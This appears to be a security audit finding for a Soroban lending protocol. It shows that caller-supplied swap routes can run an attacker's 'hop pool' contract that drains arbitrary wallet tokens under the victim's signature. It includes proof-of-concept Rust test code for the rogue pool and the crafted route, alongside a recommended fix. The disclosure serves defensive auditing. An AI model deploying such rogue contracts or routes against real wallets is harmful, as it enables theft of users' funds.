### Title
Attacker-crafted swap route lets code inside the route invoke `token.transfer` under the victim's authorization tree, draining arbitrary wallet tokens - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The controller's strategy paths (`swap_collateral`, `swap_debt`, `multiply`, `repay_debt_with_collateral`) accept a fully caller-supplied `StrategySwap` route blob and forward it to the configured swap aggregator. The controller validates only `token_in`, `token_out`, `amount_in`, and the measured balance deltas — it never inspects which contracts the route invokes. A route can therefore name an attacker-deployed "hop pool" that calls `token::transfer(victim, attacker, amount)` on any token. Because that call executes below the victim's `require_auth` on the router call, Soroban records it as a child of the victim's authorization entry; if the victim signs the displayed tree, the transfer executes. This is the on-chain analog of CVE-2025-8582: insufficient validation of untrusted input lets crafted content ride on a signature the user believes covers only a benign swap.

### Finding Description
`swap_tokens` authorizes exactly one input transfer and measures output, but imposes no constraint on the route's internals [1](#0-0) . The threat model itself confirms the router "keeps no allowlist" of the pool/token addresses its payload names, so route-designated third-party code runs "below the caller's authorization," and a transfer it makes from the caller "executes if the caller signs that tree" — the loss is "the caller's wallet, not the routed amount" [2](#0-1) . The harness test proves reachability: `RogueHopPool::swap` calls `token::Client::transfer(&victim, &to, &amount)` for an unlisted token the protocol never touches, and the route is injected via `swap_collateral(account_id, USDC, amount, ETH, route)` [3](#0-2) [4](#0-3) . Entrypoints: `XoxnoLending::swap_collateral(caller, account_id, collateral, amount, target, swap)`, `swap_debt`, `multiply`, `repay_debt_with_collateral` — all take the raw `swap: Bytes`/`StrategySwap` from the caller.

### Impact Explanation
Theft of user funds: any token in the victim's wallet (including assets never listed on the protocol) can be transferred to the attacker inside a transaction the victim authorized as an ordinary collateral/debt swap. Loss is bounded only by the victim's wallet balances, not by `amount_in` — neither the payload minimum-output check nor the post-swap risk gate bounds the child transfer [5](#0-4) .

### Likelihood Explanation
Requires user interaction: the victim must submit (and sign the auth tree of) a transaction carrying the malicious route — typically obtained by spoofing or compromising the quote service / front-end that produces route bytes, precisely the "crafted HTML page" precondition of the CVE. Any unprivileged attacker can deploy the rogue hop contract and craft the payload; no privileged role, oracle manipulation, or leaked key is needed. Medium severity mirrors the source CVSS 4.3 (UI:R, integrity loss). The mitigating factor is that an attentive wallet/client could detect the extra child invocation, and the threat model documents this as a client-side duty — but the protocol itself performs zero route validation [6](#0-5) .

### Recommendation
Constrain what a route can do under the caller's authorization: have the aggregator enforce a venue allowlist (restricted to Aquarius/Soroswap pool contracts the caller's trade legitimately touches), or have the controller require the route to commit to an explicit, bounded set of token contracts and reject any invocation outside the declared `token_in`/`token_out` pair. At minimum, hash the expected route structure into what the client displays so a swapped-in rogue hop is detectable before signing.

### Proof of Concept
See `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`:
1. Attacker deploys `RogueHopPool` initialized with `(victim=alice, wallet_token, to=attacker, amount)` [7](#0-6) .
2. Victim calls `swap_collateral` with `RoutedSwap { hop_pool: rogue, min_out: FAIR_OUT_ETH, token_in: USDC, token_out: ETH }` encoded as `swap` bytes [8](#0-7) .
3. Router pulls `amount_in` USDC (the one authorized child), invokes `hop_pool.swap()`, which executes `wallet_token.transfer(alice → attacker, amount)` beneath Alice's auth entry, then pays out `min_out` ETH [9](#0-8) .
4. Controller sees `in_after <= in_before`, positive ETH delta, and healthy final account — the swap "succeeds" and Alice loses `WALLET_BALANCE` of an unrelated token.

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L34-54)
```rust
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-47)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L56-72)
```rust
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L147-164)
```rust
    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
        match result {
            Ok(Ok(())) => Ok(()),
            Ok(Err(e)) => panic!("conversion error: {e:?}"),
            Err(Ok(e)) => Err(e),
            Err(Err(e)) => panic!("invoke error: {e:?}"),
        }
    }
```
